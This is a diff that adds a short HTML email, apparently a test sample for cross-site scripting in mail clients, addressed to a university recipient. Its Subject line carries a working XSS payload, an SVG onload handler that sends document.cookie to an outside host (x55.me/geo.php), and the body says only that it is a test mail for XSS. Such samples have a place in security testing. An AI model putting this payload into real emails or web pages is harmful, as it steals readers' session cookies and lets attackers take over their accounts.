@@ -1,0 +1,7 @@
+From: "Dani" <The00@hp.com>
+To: Ener Borg <ener.borg@bio.uio.no>
+Subject: <svg onload='img=new Image();img.src="//x55.me/geo.php?get="+document.cookie;'>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
